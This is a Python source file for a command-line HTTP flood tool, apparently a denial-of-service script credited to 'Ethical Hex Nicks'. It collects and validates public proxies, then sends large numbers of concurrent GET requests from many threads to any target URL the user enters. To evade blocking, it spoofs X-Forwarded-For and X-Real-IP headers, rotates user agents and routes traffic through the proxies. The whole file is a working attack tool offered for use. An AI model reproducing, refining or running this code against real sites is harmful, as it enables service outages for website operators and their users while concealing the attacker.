import aiohttp
import asyncio
import threading
import random
import itertools
import time
import re
import string
import sys
import shutil
from colorama import Fore, init

init(autoreset=True)


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]


proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
]


async def fetch_proxy_source(session: aiohttp.ClientSession, url: str, sem: asyncio.Semaphore, timeout_seconds: int = 10):
    try:
        async with sem:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                if resp.status != 200:
                    return []
                text = await resp.text()
                # capture ip:port entries
                matches = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b", text)
                return matches
    except Exception:
        return []

async def gather_proxies(sources, concurrency=8, per_source_timeout=8):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
    timeout = aiohttp.ClientTimeout(total=per_source_timeout)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [fetch_proxy_source(session, url, sem, timeout_seconds=per_source_timeout) for url in sources]
        results = await asyncio.gather(*tasks, return_exceptions=False)
    all_proxies = [p for sub in results for p in sub]
    # de-duplicate preserving order
    seen = set()
    dedup = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            dedup.append(p)
    return dedup

async def check_single_proxy(session: aiohttp.ClientSession, proxy: str, sem: asyncio.Semaphore, test_url: str, timeout_seconds: int = 5):
    
    proxy_url = f"http://{proxy}"
    try:
        async with sem:
            
            async with session.get(test_url, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                if 200 <= resp.status < 400:
                    return proxy
    except Exception:
        return None
    return None

async def validate_proxies(proxies, concurrency=50, test_url="https://httpbin.org/ip", timeout_seconds=5, max_valid=300):
    if not proxies:
        return []

    sem = asyncio.Semaphore(concurrency)
    
    connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
    timeout = aiohttp.ClientTimeout(total=timeout_seconds)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        to_test = proxies[:5000]
        tasks = [asyncio.create_task(check_single_proxy(session, p, sem, test_url, timeout_seconds)) for p in to_test]
        results = await asyncio.gather(*tasks, return_exceptions=False)

    valid = [r for r in results if r]
    if len(valid) > max_valid:
        return valid[:max_valid]
    return valid

class AsyncAttacker:
    def __init__(self, target_url: str, num_requests: int, max_concurrent: int = 50, proxy_list=None, show_start_msg=True):
        self.target_url = target_url
        self.num_requests = max(0, int(num_requests))
        self.max_concurrent = max(1, int(max_concurrent))
        self.proxy_list = proxy_list or []  # proxy strings "ip:port"
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self._print_lock = asyncio.Lock()
        self.show_start_msg = show_start_msg

    def _make_headers(self, ip_address: str):
        return {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": self.target_url,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }

    async def send_request(self, session: aiohttp.ClientSession, ip_address: str):
        headers = self._make_headers(ip_address)
        # choose proxy if available
        proxy_arg = None
        if self.proxy_list:
            chosen = random.choice(self.proxy_list)
            proxy_arg = f"http://{chosen}"
        try:
            
            per_request_timeout = aiohttp.ClientTimeout(total=5)
            if proxy_arg:
                async with session.get(self.target_url, headers=headers, proxy=proxy_arg, timeout=per_request_timeout) as resp:
                    status = resp.status
            else:
                async with session.get(self.target_url, headers=headers, timeout=per_request_timeout) as resp:
                    status = resp.status

            if 200 <= status < 300:
                self.success_count += 1
            else:
                self.fail_count += 1
            return status
        except Exception as e:
            self.fail_count += 1
            
            print(Fore.YELLOW + f"[request error] {type(e).__name__}: {e}")
            return None

    async def worker(self, q: asyncio.Queue, session: aiohttp.ClientSession, worker_id: int):
        while True:
            item = await q.get()
            if item is None:
                q.task_done()
                return
            await self.send_request(session, item)
            q.task_done()
            done = self.success_count + self.fail_count
            if done and done % 50 == 0:
                elapsed = time.time() - self.start_time
                rate = done / elapsed if elapsed > 0 else 0
                async with self._print_lock:
                    print(Fore.RED + f"[w{worker_id}] Done: {done} | Rate: {rate:.1f}/s")

    async def attack(self):
        if self.num_requests <= 0:
            return 0, 0, 0.0

        self.start_time = time.time()
        if self.show_start_msg:
            print(Fore.CYAN + f"Starting attack: {self.num_requests} requests, concurrency={self.max_concurrent} | using proxies: {bool(self.proxy_list)}")

        
        ip_list = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(2000)]
        ip_cycle = itertools.cycle(ip_list)

        
        q = asyncio.Queue()
        for _ in range(self.num_requests):
            await q.put(next(ip_cycle))

        
        conn_limit = max(10, min(self.max_concurrent * 2, 1000))
        connector = aiohttp.TCPConnector(limit=conn_limit, limit_per_host=max(1, self.max_concurrent), ssl=False)
        timeout = aiohttp.ClientTimeout(total=None)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            worker_count = min(self.max_concurrent, self.num_requests, conn_limit)
            tasks = [asyncio.create_task(self.worker(q, session, i)) for i in range(worker_count)]
            # wait until work done
            await q.join()
            # stop workers
            for _ in tasks:
                await q.put(None)
            await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = time.time() - self.start_time
        return self.success_count, self.fail_count, elapsed



def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
 █▄░█ █░█ █░░ █░░ █▀ █▀▀ █▀▀
 █░▀█ █▄█ █▄▄ █▄▄ ▄█ ██▄ █▄▄

 █▀█ █░█ █ █░░ █ █▀█ █▀█ █ █▄░█ █▀▀ █▀
 █▀▀ █▀█ █ █▄▄ █ █▀▀ █▀▀ █ █░▀█ ██▄ ▄█

      Made By: Ethical Hex Nicks
"""
    for line in banner.splitlines():
        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")

def run_threaded_attack(target_url: str, total_requests: int, thread_count: int, validate_proxies_flag: bool = True):
    print(Fore.CYAN + "Fetching proxy list (global)...")
    try:
        proxies = asyncio.run(gather_proxies(proxy_sources, concurrency=8, per_source_timeout=8))
    except Exception:
        proxies = []

    valid_proxies = []
    if validate_proxies_flag and proxies:
        print(Fore.CYAN + f"Validating up to {len(proxies)} proxies (concurrency=50)...")
        try:
            # validate against httpbin which returns caller IP; you can change test_url if you want
            valid_proxies = asyncio.run(validate_proxies(proxies, concurrency=50, test_url="https://httpbin.org/ip", timeout_seconds=5, max_valid=400))
        except Exception:
            valid_proxies = []

    if valid_proxies:
        print(Fore.GREEN + f"Proxy validation complete: {len(valid_proxies)} working proxies (using proxies for requests).")
    else:
        print(Fore.YELLOW + "No working proxies found (or validation disabled). Requests will be sent directly.")

    # split work between threads
    per_thread = total_requests // thread_count
    remainder = total_requests % thread_count

    threads = []
    results = []
    results_lock = threading.Lock()

    def thread_target(tid: int, assigned_requests: int):
        # compute per-thread concurrency
        per_thread_concurrency = max(5, 250 // max(1, thread_count))
        per_thread_concurrency = min(per_thread_concurrency, max(1, assigned_requests))
        attacker = AsyncAttacker(target_url, assigned_requests, max_concurrent=per_thread_concurrency, proxy_list=valid_proxies, show_start_msg=(tid==0))
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            success, fail, elapsed = loop.run_until_complete(attacker.attack())
            loop.close()
        except Exception as e:
            success, fail, elapsed = 0, assigned_requests, 0.0
            print(Fore.YELLOW + f"[thread {tid}] exception: {e}")
        with results_lock:
            results.append((tid, success, fail, elapsed))

    for i in range(thread_count):
        assigned = per_thread + (1 if i < remainder else 0)
        t = threading.Thread(target=thread_target, args=(i, assigned), daemon=False)
        threads.append(t)
        t.start()
        time.sleep(0.01)

    for t in threads:
        t.join()

    total_success = sum(r[1] for r in results)
    total_fail = sum(r[2] for r in results)
    total_elapsed = sum(r[3] for r in results)

    print(Fore.BLUE + f"Attack finished. Threads: {thread_count} | Requests: {total_requests}")
    print(Fore.BLUE + f"Total success: {total_success} | Total fail: {total_fail}")
    if total_success + total_fail > 0:
        print(Fore.GREEN + f"Success rate: {total_success/(total_success+total_fail)*100:.2f}%")
    print(Fore.BLUE + f"Sum of thread elapsed times: {total_elapsed:.2f}s")

# -- CLI

if __name__ == "__main__":
    print_banner()

    try:
        target_url = input(Fore.RED + "Enter Target URL: ").strip()
        if not target_url:
            raise ValueError("Empty URL")
    except Exception:
        print(Fore.YELLOW + "No target provided. Exiting.")
        sys.exit(1)

    try:
        total_requests = int(input(Fore.RED + "Enter Total Number of Requests: ").strip())
        if total_requests < 0:
            raise ValueError()
    except Exception:
        print(Fore.YELLOW + "Invalid number of requests. Exiting.")
        sys.exit(1)

    try:
        thread_count = int(input(Fore.RED + "Enter number of OS threads to use: ").strip())
        if thread_count < 1:
            raise ValueError()
    except Exception:
        print(Fore.YELLOW + "Invalid thread count, using 1.")
        thread_count = 1

    # Ask whether to validate proxies (takes extra time)
    try:
        v = input(Fore.RED + "Validate fetched proxies before attacking? (y/N): ").strip().lower()
        validate_flag = (v == "y" or v == "yes")
    except Exception:
        validate_flag = True

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    run_threaded_attack(target_url, total_requests, thread_count, validate_proxies_flag=validate_flag)